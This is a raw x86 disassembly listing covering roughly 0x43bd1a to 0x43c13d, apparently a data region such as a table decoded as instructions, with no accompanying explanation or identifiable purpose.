  43bd1a:	jb     0x43bd55
  43bd1c:	ja     0x43bd57
  43bd1e:	jl     0x43bd59
  43bd20:	fwait
  43bd21:	cmp    DWORD PTR [ecx-0x6c616c7],ebp
  43bd27:	cmp    DWORD PTR [eax+0x3a],ebx
  43bd2a:	pop    ebp
  43bd2b:	cmp    ah,BYTE PTR [edx+0x3a]
  43bd2e:	jb     0x43bd6a
  43bd30:	cmp    BYTE PTR [edx],0xa5
  43bd33:	cmp    bh,BYTE PTR [edi+0x3b]
  43bd36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bd37:	cmp    ebp,DWORD PTR [ebx+0x3c]
  43bd3a:	outs   dx,DWORD PTR ds:[esi]
  43bd3b:	cmp    al,0x73
  43bd3d:	cmp    al,0x77
  43bd3f:	cmp    al,0x7b
  43bd41:	cmp    al,0x7f
  43bd43:	cmp    al,0x83
  43bd45:	cmp    al,0x87
  43bd47:	cmp    al,0x8b
  43bd49:	cmp    al,0x8f
  43bd4b:	cmp    al,0x93
  43bd4d:	cmp    al,0x97
  43bd4f:	cmp    al,0x9b
  43bd51:	cmp    al,0x9f
  43bd53:	cmp    al,0xa3
  43bd55:	cmp    al,0xa7
  43bd57:	cmp    al,0xab
  43bd59:	cmp    al,0xaf
  43bd5b:	cmp    al,0xb8
  43bd5d:	cmp    al,0xee
  43bd5f:	cmp    al,0xf7
  43bd61:	cmp    al,0x1a
  43bd63:	cmp    eax,0x3d3e3d34
  43bd68:	dec    esp
  43bd69:	cmp    eax,0x3d673d5b
  43bd6e:	stos   DWORD PTR es:[edi],eax
  43bd6f:	cmp    eax,0x3dc73db1
  43bd74:	loop   0x43bdb3
  43bd76:	in     eax,dx
  43bd77:	cmp    eax,0x3e333dfb
  43bd7c:	inc    eax
  43bd7d:	ds dec esi
  43bd7f:	ds pop ebx
  43bd81:	bound  edi,QWORD PTR ds:[esi]
  43bd84:	push   0x7a3e6e3e
  43bd89:	ds call 0xc33e:0xb73ead3e
  43bd91:	ds loope 0x43bdd2
  43bd94:	sti    
  43bd95:	ds push cs
  43bd97:	aas    
  43bd98:	sbb    edi,DWORD PTR [edi]
  43bd9a:	and    edi,DWORD PTR [edi]
  43bd9c:	cmp    BYTE PTR [edi],bh
  43bd9e:	dec    eax
  43bd9f:	aas    
  43bda0:	push   edx
  43bda1:	aas    
  43bda2:	cmp    DWORD PTR [edi],0x3fb33f9c
  43bda8:	mov    ebx,0x3fc03f
  43bdad:	rol    BYTE PTR [eax],1
  43bdaf:	add    BYTE PTR [eax],ch
  43bdb1:	add    DWORD PTR [eax],eax
  43bdb3:	add    BYTE PTR [eax],al
  43bdb5:	xor    BYTE PTR [edi],al
  43bdb7:	xor    BYTE PTR [edi],dl
  43bdb9:	xor    BYTE PTR [esi],bl
  43bdbb:	xor    BYTE PTR [esi+0x30],bl
  43bdbe:	imul   esi,DWORD PTR [eax],0x307b306f
  43bdc4:	xor    DWORD PTR [eax],0x30993087
  43bdca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bdcb:	xor    BYTE PTR [edi-0x31cf3ed0],dh
  43bdd1:	xor    ch,ah
  43bdd3:	xor    bl,dh
  43bdd5:	xor    dl,bh
  43bdd7:	xor    BYTE PTR [eax],al
  43bdd9:	xor    DWORD PTR [edi],ecx
  43bddb:	xor    DWORD PTR [eax],ebp
  43bddd:	xor    DWORD PTR [esi],ebp
  43bddf:	xor    DWORD PTR ds:0x5c314b31,edi
  43bde5:	xor    DWORD PTR [edx+0x31],esp
  43bde8:	jno    0x43be1b
  43bdea:	jg     0x43be1d
  43bdec:	nop
  43bded:	xor    DWORD PTR [esi-0x52ce63cf],edx
  43bdf3:	xor    edi,eax
  43bdf5:	xor    eax,esp
  43bdf7:	xor    ecx,ebp
  43bdf9:	xor    ebx,edi
  43bdfb:	xor    DWORD PTR [eax],ecx
  43bdfd:	xor    dl,BYTE PTR [ecx]
  43bdff:	xor    bl,BYTE PTR [ecx]
  43be01:	xor    dh,BYTE PTR [edx+esi*1]
  43be04:	inc    esi
  43be05:	xor    cl,BYTE PTR [edx+esi*1+0x59]
  43be09:	xor    ah,BYTE PTR [esi+0x32]
  43be0c:	ins    BYTE PTR es:[edi],dx
  43be0d:	xor    dh,BYTE PTR [edx+0x32]
  43be10:	jg     0x43be44
  43be12:	mov    dh,BYTE PTR [edx]
  43be14:	xchg   edx,eax
  43be15:	xor    ch,BYTE PTR [eax-0x48cd51ce]
  43be1b:	xor    al,dl
  43be1d:	xor    cl,al
  43be1f:	xor    cl,ah
  43be21:	xor    dl,dl
  43be23:	xor    bl,cl
  43be25:	xor    ah,al
  43be27:	xor    ch,ah
  43be29:	xor    dh,cl
  43be2b:	xor    cl,BYTE PTR [eax]
  43be2d:	xor    ecx,DWORD PTR [esi]
  43be2f:	xor    ebx,DWORD PTR [ecx]
  43be31:	xor    esp,DWORD PTR [esi]
  43be33:	xor    esi,DWORD PTR [ebx]
  43be35:	xor    eax,DWORD PTR [ebx+esi*1+0x4a]
  43be39:	xor    edx,DWORD PTR [ebx+0x33]
  43be3c:	pop    esp
  43be3d:	xor    ebp,DWORD PTR [ebx+0x33]
  43be40:	jnp    0x43be75
  43be42:	mov    BYTE PTR [ebx],dh
  43be44:	xchg   ecx,eax
  43be45:	xor    ebx,DWORD PTR [ebx+esi*1+0x33ac33a3]
  43be4c:	shl    DWORD PTR [ebx],0xe4
  43be4f:	xor    ebp,esp
  43be51:	xor    edi,esi
  43be53:	xor    edx,DWORD PTR [ecx]
  43be55:	xor    al,0x28
  43be57:	xor    al,0x57
  43be59:	xor    al,0x75
  43be5b:	xor    al,0xa4
  43be5d:	xor    al,0xef
  43be5f:	xor    al,0xb7
  43be61:	xor    eax,0x361c360b
  43be66:	cdq    
  43be67:	ss leave 
  43be69:	ss aam 0x36
  43be6c:	fidiv  WORD PTR [esi]
  43be6e:	hlt    
  43be6f:	add    esi,DWORD PTR ss:[edi]
  43be72:	and    al,0x37
  43be74:	push   edx
  43be75:	aaa    
  43be76:	js     0x43beaf
  43be78:	adc    BYTE PTR [eax],bh
  43be7a:	dec    edx
  43be7b:	cmp    BYTE PTR [edx],al
  43be7d:	cmp    DWORD PTR [edx],ecx
  43be7f:	cmp    DWORD PTR [ecx],ebx
  43be81:	cmp    DWORD PTR [ebx+0x39],edi
  43be84:	enter  0xd939,0x39
  43be88:	add    DWORD PTR [edx],edi
  43be8a:	or     eax,0x3e3a253a
  43be8f:	cmp    al,BYTE PTR [ebx+0x3a]
  43be92:	dec    esi
  43be93:	cmp    bl,BYTE PTR [edi+0x3a]
  43be96:	outs   dx,DWORD PTR ds:[esi]
  43be97:	cmp    al,BYTE PTR [edx+edi*1+0x3ac93a8e]
  43be9e:	out    0x3a,al
  43bea0:	add    BYTE PTR [ebx],bh
  43bea2:	sbb    eax,0xa83b573b
  43bea7:	cmp    ebx,DWORD PTR [edi]
  43bea9:	cmp    al,0xca
  43beab:	cmp    al,0xd6
  43bead:	cmp    al,0xde
  43beaf:	cmp    al,0xf6
  43beb1:	cmp    al,0x3
  43beb3:	cmp    eax,0x3e0f3d09
  43beb8:	xor    edi,DWORD PTR [esi]
  43beba:	test   BYTE PTR [esi],bh
  43bebc:	lea    edi,[esi]
  43bebe:	sahf   
  43bebf:	fdivr  DWORD PTR ds:[esi]
  43bec2:	loop   0x43bf02
  43bec4:	out    dx,al
  43bec5:	ds sbb eax,0x9a3f523f
  43becb:	aas    
  43becc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43becd:	aas    
  43bece:	scas   al,BYTE PTR es:[edi]
  43becf:	aas    
  43bed0:	mov    edx,0x3fef3f
  43bed5:	loopne 0x43bed7
  43bed7:	add    BYTE PTR [eax+0x0],bh
  43beda:	add    BYTE PTR [eax],al
  43bedc:	(bad)  
  43bedd:	xor    BYTE PTR [esi],dl
  43bedf:	xor    DWORD PTR [ecx+esi*1+0x6a],esp
  43bee3:	xor    DWORD PTR [edx+0x31],edi
  43bee6:	xor    DWORD PTR [ecx],0xffffffb7
  43bee9:	xor    DWORD PTR [edi-0x1ece3acf],edi
  43beef:	xor    edi,esp
  43bef1:	xor    ebx,esi
  43bef3:	xor    DWORD PTR [eax],eax
  43bef5:	xor    bl,BYTE PTR [ecx]
  43bef7:	xor    bl,BYTE PTR [edx+0x32]
  43befa:	mov    esi,DWORD PTR [edx]
  43befc:	pop    ss
  43befd:	xor    eax,DWORD PTR [ecx+0x33]
  43bf00:	jno    0x43bf35
  43bf02:	mov    ebx,0x4f34fc33
  43bf07:	xor    eax,0x35d93573
  43bf0c:	fbstp  TBYTE PTR ds:0x363935fe
  43bf12:	jo     0x43bf4a
  43bf14:	test   DWORD PTR [esi],esi
  43bf16:	pushf  
  43bf17:	ss sti 
  43bf19:	ss aam 0x37
  43bf1c:	sbb    bh,BYTE PTR [eax]
  43bf1e:	lds    edi,FWORD PTR [eax]
  43bf20:	out    dx,al
  43bf21:	cmp    BYTE PTR [ebx+0x39],bl
  43bf24:	fnstcw WORD PTR [ecx]
  43bf26:	push   es
  43bf27:	cmp    ebp,DWORD PTR [edi]
  43bf29:	cmp    esi,DWORD PTR [edi]
  43bf2b:	cmp    edi,DWORD PTR [edi]
  43bf2d:	cmp    ecx,DWORD PTR [esi+0x3b]
  43bf30:	pop    edx
  43bf31:	cmp    esp,DWORD PTR [ebx+0x2b3bb03b]
  43bf37:	cmp    al,0x9b
  43bf39:	cmp    eax,0x3dd73da7
  43bf3e:	jmp    0x93824880
  43bf43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bf45:	ds in  eax,dx
  43bf47:	cmp    DWORD PTR ds:[edi],edi
  43bf4a:	add    BYTE PTR [eax],al
  43bf4c:	add    al,dh
  43bf4e:	add    BYTE PTR [eax],al
  43bf50:	cmp    BYTE PTR [ecx],al
  43bf52:	add    BYTE PTR [eax],al
  43bf54:	xor    BYTE PTR [di+0x30],bh
  43bf58:	(bad)  
  43bf59:	xor    BYTE PTR [ecx+0x77325931],bh
  43bf5f:	xor    bl,BYTE PTR [edi-0x38cd3ece]
  43bf65:	xor    ecx,esi
  43bf67:	xor    ebp,ecx
  43bf69:	xor    edx,DWORD PTR [edi]
  43bf6b:	xor    al,0x37
  43bf6d:	xor    al,0x8d
  43bf6f:	xor    eax,0x362535d3
  43bf74:	outs   dx,DWORD PTR ds:[esi]
  43bf75:	ss ss aaa 
  43bf78:	jne    0x43bfb1
  43bf7a:	xor    BYTE PTR [edi],0xe7
  43bf7d:	aaa    
  43bf7e:	leave  
  43bf7f:	cmp    BYTE PTR [esi+0x39],bl
  43bf82:	mov    bh,BYTE PTR [ecx]
  43bf84:	stos   BYTE PTR es:[edi],al
  43bf85:	cmp    DWORD PTR [edi-0x15c62ec7],edi
  43bf8b:	cmp    DWORD PTR [esi+0x3a],ebp
  43bf8e:	ja     0x43bfca
  43bf90:	jge    0x43bfcc
  43bf92:	cmp    BYTE PTR [edx],0x89
  43bf95:	cmp    ah,BYTE PTR [eax-0x4dc553c6]
  43bf9b:	cmp    al,ah
  43bf9d:	cmp    cl,dh
  43bf9f:	cmp    dl,bh
  43bfa1:	cmp    ah,cl
  43bfa3:	cmp    ah,bh
  43bfa5:	cmp    dh,al
  43bfa7:	cmp    dh,dh
  43bfa9:	cmp    bh,bl
  43bfab:	cmp    al,BYTE PTR [eax]
  43bfad:	cmp    eax,DWORD PTR ds:0x123b0d3b
  43bfb3:	cmp    esp,DWORD PTR [ebx+edi*1]
  43bfb6:	sub    al,0x3b
  43bfb8:	xor    bh,BYTE PTR [ebx]
  43bfba:	cmp    ecx,DWORD PTR ds:[ecx+0x3b]
  43bfbe:	push   edx
  43bfbf:	cmp    ebx,DWORD PTR [ebx+edi*1+0x63]
  43bfc3:	cmp    ebp,DWORD PTR [ecx+0x3b]
  43bfc6:	outs   dx,BYTE PTR ds:[esi]
  43bfc7:	cmp    esi,DWORD PTR [ebx+0x3b]
  43bfca:	js     0x43c007
  43bfcc:	jge    0x43c009
  43bfce:	cmp    DWORD PTR [ebx],0xffffff8b
  43bfd1:	cmp    ebx,DWORD PTR [edi-0x26c446c5]
  43bfd7:	cmp    ebp,ebx
  43bfd9:	cmp    esi,ebx
  43bfdb:	cmp    edi,eax
  43bfdd:	cmp    edi,ebp
  43bfdf:	cmp    ebx,DWORD PTR [edi]
  43bfe1:	cmp    al,0x25
  43bfe3:	cmp    al,0x2c
  43bfe5:	cmp    al,0x31
  43bfe7:	cmp    al,0x3e
  43bfe9:	cmp    al,0x4d
  43bfeb:	cmp    al,0x55
  43bfed:	cmp    al,0x5d
  43bfef:	cmp    al,0x71
  43bff1:	cmp    al,0x77
  43bff3:	cmp    al,0x7c
  43bff5:	cmp    al,0x84
  43bff7:	cmp    al,0x8a
  43bff9:	cmp    al,0x90
  43bffb:	cmp    al,0x9d
  43bffd:	cmp    al,0xa3
  43bfff:	cmp    al,0xad
  43c001:	cmp    al,0xcc
  43c003:	cmp    al,0xd2
  43c005:	cmp    al,0xdc
  43c007:	cmp    al,0xe2
  43c009:	cmp    al,0xeb
  43c00b:	cmp    al,0xf0
  43c00d:	cmp    al,0xd
  43c00f:	cmp    eax,0x3d263d1f
  43c014:	cmp    DWORD PTR ds:0x3d773d71,edi
  43c01a:	jge    0x43c059
  43c01c:	cmp    DWORD PTR ds:0x3d8f3d89,0xffffff96
  43c023:	cmp    eax,0x3da43d9d
  43c028:	stos   DWORD PTR es:[edi],eax
  43c029:	cmp    eax,0x3db93db2
  43c02e:	sar    BYTE PTR ds:0x3dd03dc8,0xd8
  43c035:	cmp    eax,0x3ded3de4
  43c03a:	repnz cmp eax,0x3e023df8
  43c040:	or     al,0x3e
  43c042:	sbb    al,0x3e
  43c044:	sub    al,0x3e
  43c046:	cmp    al,0x3e
  43c048:	inc    ebp
  43c049:	ds jbe 0x43c08a
  43c04c:	jl     0x43c08c
  43c04e:	cmp    BYTE PTR [esi],0x88
  43c051:	mov    ?,WORD PTR ds:[esi]
  43c054:	xchg   esp,eax
  43c055:	ds fwait
  43c057:	mov    ds:0xb03ea93e,al
  43c05d:	ds mov bh,0x3e
  43c060:	mov    esi,0xcd3ec53e
  43c065:	ds aad 0x3e
  43c068:	fnstsw WORD PTR [esi]
  43c06a:	call   0xf382adad
  43c06f:	ds std 
  43c071:	ds pop es
  43c073:	aas    
  43c074:	sbb    bh,BYTE PTR [edi]
  43c076:	pop    ds
  43c077:	aas    
  43c078:	ins    BYTE PTR es:[edi],dx
  43c079:	aas    
  43c07a:	jl     0x43c0bb
  43c07c:	cmp    BYTE PTR [edi],0xf6
  43c07f:	aas    
  43c080:	sti    
  43c081:	aas    
  43c082:	add    BYTE PTR [eax],al
  43c084:	add    BYTE PTR [eax],al
  43c086:	add    DWORD PTR [eax],eax
  43c088:	add    BYTE PTR [eax],0x0
  43c08b:	add    BYTE PTR ds:0x3f302b30,cl
  43c091:	xor    BYTE PTR [ebp+0x30],al
  43c094:	call   0x1774cbc9
  43c099:	xor    DWORD PTR [esi],esp
  43c09b:	xor    DWORD PTR [edi],ebp
  43c09d:	xor    DWORD PTR [ecx+esi*1],edi
  43c0a0:	imul   esi,DWORD PTR [ecx],0x73
  43c0a3:	xor    DWORD PTR [ebp+0x31],edi
  43c0a6:	mov    ?,WORD PTR [ecx]
  43c0a8:	cdq    
  43c0a9:	xor    DWORD PTR [esi-0x45ce5ccf],ebx
  43c0af:	xor    ebp,eax
  43c0b1:	xor    ebx,ecx
  43c0b3:	xor    esi,ebx
  43c0b5:	xor    ebx,esi
  43c0b7:	xor    esi,edi
  43c0b9:	xor    DWORD PTR [edx+esi*1],edx
  43c0bc:	xor    bh,BYTE PTR cs:[eax]
  43c0bf:	xor    dh,BYTE PTR [edx+esi*1+0x79]
  43c0c3:	xor    dl,BYTE PTR [edx+esi*1+0x32da3299]
  43c0ca:	loopne 0x43c0fe
  43c0cc:	icebp  
  43c0cd:	xor    cl,BYTE PTR [esi]
  43c0cf:	xor    ebx,DWORD PTR [ecx+0x33]
  43c0d2:	pop    esi
  43c0d3:	xor    ebp,DWORD PTR [esi+0x33]
  43c0d6:	je     0x43c10b
  43c0d8:	jp     0x43c10d
  43c0da:	xor    BYTE PTR [ebx],0x86
  43c0dd:	xor    ecx,DWORD PTR [ebx+esi*1+0x33983392]
  43c0e4:	sahf   
  43c0e5:	xor    esp,DWORD PTR [ebx+esi*1+0x33b033aa]
  43c0ec:	shl    DWORD PTR [ebx],0xde
  43c0ef:	xor    edi,DWORD PTR [esi+0x34]
  43c0f2:	test   BYTE PTR [esp+ebx*4],dh
  43c0f5:	xor    al,0xa0
  43c0f7:	xor    al,0xbc
  43c0f9:	xor    al,0xc0
  43c0fb:	xor    al,0xe0
  43c0fd:	xor    al,0xfc
  43c0ff:	xor    al,0x0
  43c101:	xor    eax,0x10000000
  43c106:	add    DWORD PTR [eax],eax
  43c108:	cmp    al,0x0
  43c10a:	add    BYTE PTR [eax],al
  43c10c:	push   0x70306c30
  43c111:	xor    BYTE PTR [eax+esi*1+0x78],dh
  43c115:	xor    BYTE PTR [eax-0x6fcf77d0],al
  43c11b:	xor    BYTE PTR [eax-0x57cf5fd0],bl
  43c121:	xor    BYTE PTR [eax-0x3fcf47d0],dh
  43c127:	xor    al,cl
  43c129:	xor    al,dl
  43c12b:	xor    al,bl
  43c12d:	xor    al,ah
  43c12f:	xor    al,ch
  43c131:	xor    al,dh
  43c133:	xor    al,bh
  43c135:	xor    BYTE PTR [eax],al
  43c137:	xor    DWORD PTR [eax],ecx
  43c139:	xor    DWORD PTR [eax],edx
  43c13b:	xor    DWORD PTR [eax],ebx
  43c13d:	xor    DWORD PTR [eax],eax
	...
